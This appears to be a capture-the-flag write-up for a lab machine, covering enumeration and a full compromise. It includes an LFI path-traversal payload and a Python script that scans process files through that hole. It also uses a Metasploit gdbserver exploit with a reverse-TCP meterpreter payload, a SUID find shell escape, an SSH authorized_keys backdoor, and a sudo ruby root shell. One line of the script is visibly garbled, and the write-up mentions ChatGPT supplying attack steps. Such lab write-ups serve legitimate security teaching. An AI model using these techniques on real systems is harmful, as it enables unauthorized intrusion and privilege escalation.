![](https://i.imgur.com/AiOGiJk.png)

## Initial Enumeration 

```bash
❯ nmap -sVC 10.10.248.127 -T4

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-13 16:32 WAT
Nmap scan report for 10.10.248.127
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b8:64:f7:a9:df:29:3a:b5:8a:58:ff:84:7c:1f:1a:b7 (RSA)
|   256 ad:61:3e:c7:10:32:aa:f1:f2:28:e2:de:cf:84:de:f0 (ECDSA)
|_  256 a9:d8:49:aa:ee:de:c4:48:32:e4:f1:9e:2a:8a:67:f0 (ED25519)
8000/tcp open  http-alt Werkzeug/3.0.2 Python/3.8.10
|_http-title: Did not follow redirect to http://airplane.thm:8000/?page=index.html
|_http-server-header: Werkzeug/3.0.2 Python/3.8.10
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/3.0.2 Python/3.8.10
|     Date: Thu, 13 Jun 2024 15:32:44 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/3.0.2 Python/3.8.10
|     Date: Thu, 13 Jun 2024 15:32:38 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 269
|     Location: http://airplane.thm:8000/?page=index.html
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://airplane.thm:8000/?page=index.html">http://airplane.thm:8000/?page=index.html</a>. If not, click the link.
|   Socks5: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('
|     ').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.94SVN%I=7%D=6/13%Time=666B1117%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,1F3,"HTTP/1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug/3\.0\
SF:.2\x20Python/3\.8\.10\r\nDate:\x20Thu,\x2013\x20Jun\x202024\x2015:32:38
SF:\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Leng
SF:th:\x20269\r\nLocation:\x20http://airplane\.thm:8000/\?page=index\.html
SF:\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n
SF:<title>Redirecting\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x2
SF:0should\x20be\x20redirected\x20automatically\x20to\x20the\x20target\x20
SF:URL:\x20<a\x20href=\"http://airplane\.thm:8000/\?page=index\.html\">htt
SF:p://airplane\.thm:8000/\?page=index\.html</a>\.\x20If\x20not,\x20click\
SF:x20the\x20link\.\n")%r(FourOhFourRequest,184,"HTTP/1\.1\x20404\x20NOT\x
SF:20FOUND\r\nServer:\x20Werkzeug/3\.0\.2\x20Python/3\.8\.10\r\nDate:\x20T
SF:hu,\x2013\x20Jun\x202024\x2015:32:44\x20GMT\r\nContent-Type:\x20text/ht
SF:ml;\x20charset=utf-8\r\nContent-Length:\x20207\r\nConnection:\x20close\
SF:r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n<title>404\x20Not\x20Foun
SF:d</title>\n<h1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20
SF:not\x20found\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x2
SF:0URL\x20manually\x20please\x20check\x20your\x20spelling\x20and\x20try\x
SF:20again\.</p>\n")%r(Socks5,213,"<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C
SF://DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x20\x20\"http://
SF:www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x20\x20<head>\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20
SF:content=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<
SF:title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\
SF:x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\
SF:x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20syntax\x20\('\\
SF:x05\\x04\\x00\\x01\\x02\\x80\\x05\\x01\\x00\\x03'\)\.</p>\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD
SF:_REQUEST\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20metho
SF:d\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 131.50 seconds
```

- from the scan result we see that there are only `two` ports open:

```
8000----web_server

22------ssh 
```

# Enumerating Web-Server

- i visited the web page `10.10.98.212:8000` and the ip got converted into `FQDN`
- then i added it to my `etc/hosts`

![](https://i.imgur.com/SBFbnqC.png)


- after adding to my `hosts` i reloaded the page:

![](https://i.imgur.com/fGI7Kbo.jpeg)

- i FUZZ for hidden Directories but the result found is useless:

```bash
❯ ffuf -u http://airplane.thm:8000/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

![](https://i.imgur.com/O7p3MEV.png)

![](https://i.imgur.com/DViHnbI.png)

- then  i tried manual `LFI` to get the `passwd` file from the server:
```
http://airplane.thm:8000/?page=../../../../etc/passwd 
```

![](https://i.imgur.com/jzAn2vl.jpeg)

![](https://i.imgur.com/eIoI1Lm.png)

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

------------------SNIP---------------------------------

carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
hudson:x:1001:1001::/home/hudson:/bin/bash
sshd:x:128:65534::/run/sshd:/usr/sbin/nologin
```

- so now i have a way to read files from the server, now i need to find files to read that will give me information more about the server:
- so i ask `chatgpt` what file can be valuable for more network attack and part of his out put is the `/proc/net/tcp` file

### Understanding `/proc/net/tcp`

The `/proc/net/tcp` file contains information about the TCP connections. Each line corresponds to a network connection and includes details like the local address, remote address, and the connection state.

- let read it :

![](https://i.imgur.com/XbpjxRv.png)

- i copy and paste the output to `chatgpt` to analyse and decode:

![](https://i.imgur.com/q52nEtv.png)

- from the port section on one ports is `not-normal` (6048)
- so i use `nmap` to enumerate more on that port:

```bash
❯ nmap -sCV 10.10.98.212 -p6048
```

![](https://i.imgur.com/skVsSHP.png)

- now to enumerate more on he port i asked `chatgpt` to create a python script to find the process-id of the running `port` :

![](https://i.imgur.com/RLUnOy3.png)

```python
import requests  
  
def read_file(base_url, path):  
    file_url = f"{base_url}/?page=../../../../{path}"  
    try:  
        response = requests.get(file_url)  
        if response.status_code == 200:  
            return response.text  
        else:  
            return None  
    except Exception as e:  
        print(f"Error reading {path}: {e}")  
        return None  
  
def find_pid_by_port(base_url, port):  
    for pid in range(1, 5000):  # Adjust the range based on the expected number of PIDs  
        cmdline_path = f"proc/{pid}/cmdline"  
        cmdline = read_file(base_url, cmdline_path)  
        if cmdline:  
            if str(port) ==in== ==cmdline:==  
                return pid  
    return None  
  
# Example usage  
base_url = 'http://airplane.thm:8000'  
port = '6048'  
pid = find_pid_by_port(base_url, port)  
if pid:  
    cmdline = read_file(base_url, f"proc/{pid}/cmdline")  
    status = read_file(base_url, f"proc/{pid}/status")  
    print(f'PID using port {port}: {pid}')  
    print(f'Command line: {cmdline}')  
    print(f'Status: {status}')  
else:  
    print(f'No process found using port {port}')
```

![](https://i.imgur.com/oHvGUSi.png)

- from the `status name` and the `command line` output i Guessed that the service running will be `gdbserver`
- now i searched for ways to exploit it:

![](https://i.imgur.com/16XP9NU.png)

[rapid7](https://www.rapid7.com/db/modules/exploit/multi/gdb/gdb_server_exec/)

![](https://i.imgur.com/T4wVNAa.png)

- after following the steps i got a meterpreter session:

![](https://i.imgur.com/24RFizk.png)

```
make sure you set target to :
	1   x86_64

and set payload to:
	set payload linux/x64/meterpreter/reverse_tcp 
```

- i enter into shell mode and stabilize the shell :

![](https://i.imgur.com/l6PLQf7.png)

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 40 cols 160
```

- so now we have a shell as `hudson` but that not what we want but there is another user that we can escalate privilege to `carlos`

- so i we need to look for files with `SUID` bit set owned by `carlos` :
```bash
find / -type f -perm -4000 -user carlos 2>/dev/null
```

![](https://i.imgur.com/p6p5RJO.png)

- so i ask `chatgpt` again for help:

![](https://i.imgur.com/BteXVIr.png)

- it didn't work so i told `chatgpt` and he generated a new one:
```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
```

![](https://i.imgur.com/ut9hLsx.png)

- `BANKAI` it works now we have the user `carlos` and can cat the `user flag` that is in carlos Directory:

![](https://i.imgur.com/c7IWnOS.png)

# **Privilege Escalation**

- to escalate privilege i created an `ssh` key on my machine `ssh-keygen -t rsa`
- and didn't specify a password:

![](https://i.imgur.com/KQfe8es.png)

- a private and public `.pub` will be created so now i have to transfer the public key to the `carlos` .ssh directory and change the name to `authorized_keys`

![](https://i.imgur.com/0c3DYD6.png)

![](https://i.imgur.com/VKRO3yB.png)

- now all i need to do is log-in via ssh with the private key and leave password filed empty:

![](https://i.imgur.com/H0iFPNj.png)

- now running `sudo -l` i discover that the carlos user can run a ruby file with NOPASSWORD:

![](https://i.imgur.com/ldwLgB7.png)

- **Create the Ruby Script**: we will Create a Ruby script that will spawn a root shell. we will need to place this script in a location where you have write access, such as `carlos` home directory (`/home/carlos`).
```rb
echo 'exec "/bin/sh"' > /home/carlos/read_root.rb
```

- **Execute the Script with Sudo**: Since we can run the `ruby` binary with `sudo`, execute the script using the appropriate path traversal to access it from the `/root` directory.
```rb
sudo /usr/bin/ruby /root/../home/carlos/read_root.rb
```

![](https://i.imgur.com/KF8xBXV.png)

### Thanks For Reading
